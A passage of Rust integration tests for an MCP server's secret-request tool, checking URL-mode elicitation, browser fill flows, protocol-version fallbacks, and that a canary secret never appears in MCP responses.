    let mut req = Request::builder().method("POST").uri("/mcp").header("authorization", format!("Bearer {}", w.app.token)).header("content-type", "application/json");
    if let Some(s) = session {
        req = req.header("mcp-session-id", s);
    }
    let resp = w.app.router.clone().oneshot(req.body(Body::from(body.to_string())).unwrap()).await.unwrap();
    let status = resp.status();
    let sid = resp.headers().get("mcp-session-id").and_then(|v| v.to_str().ok()).map(str::to_string);
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let v: Value = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
    w.keep(&v);
    (status, sid, v)
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn mcp_clients_with_url_elicitation_get_the_url_mode_error_and_others_the_url() {
    let w = world().await;
    let init = |caps: Value, version: &str| json!({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": version, "capabilities": caps, "clientInfo": {"name": "t", "version": "1"}}});
    let ask = json!({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "secret_request", "arguments": {"name": "mcp_key", "label": "MCP key", "description": "d", "target": {"hosts": [w.host()]}}}});

    let (_, sid, _) = mcp(&w, None, init(json!({"elicitation": {"url": {}}}), "2025-11-25")).await;
    let sid = sid.expect("a session id");
    assert!(sid.ends_with(".u"), "{sid}");
    let (status, _, e) = mcp(&w, Some(&sid), ask.clone()).await;
    assert_eq!(status, 200);
    assert_eq!(e["error"]["code"], -32042, "{e}");
    let el = &e["error"]["data"]["elicitations"][0];
    assert_eq!(el["mode"], "url");
    let url = el["url"].as_str().unwrap();
    assert!(url.contains("/secrets/requests/") && !url.contains("token") && !url.contains(&w.app.token), "{url}");
    assert!(el["elicitationId"].as_str().unwrap().starts_with("secret_request:"));
    // the person fills it; the client's retry gets the handle
    let id = el["elicitationId"].as_str().unwrap();
    let (status, _) = w.browser("POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": CANARY}))).await;
    assert_eq!(status, 200);
    let (_, _, done) = mcp(&w, Some(&sid), ask.clone()).await;
    assert_eq!(done["result"]["isError"], false, "{done}");
    let text: Value = serde_json::from_str(done["result"]["content"][0]["text"].as_str().unwrap()).unwrap();
    assert_eq!(text["status"], "filled", "{text}");

    // a client without URL mode (or on an older protocol) gets the tool result with the fill URL
    for (caps, version) in [(json!({"elicitation": {}}), "2025-11-25"), (json!({"elicitation": {"url": {}}}), "2025-06-18"), (json!({}), "2025-11-25")] {
        let (_, sid, _) = mcp(&w, None, init(caps.clone(), version)).await;
        let sid = sid.unwrap();
        assert!(!sid.ends_with(".u"), "{caps} {version}");
        let mut other = ask.clone();
        other["params"]["arguments"]["name"] = json!(format!("plain_{}", version.replace('-', "")));
        let (_, _, r) = mcp(&w, Some(&sid), other).await;
        let text: Value = serde_json::from_str(r["result"]["content"][0]["text"].as_str().unwrap()).unwrap_or(Value::Null);
        assert!(text["status"] == "pending" || text["status"] == "filled", "{r}");
        if text["status"] == "pending" {
            assert!(text["fill_url"].as_str().unwrap().contains("/secrets/requests/"));
        }
    }
    let responses = w.seen.lock().unwrap().join("\n");
    assert!(!responses.contains(CANARY));
}
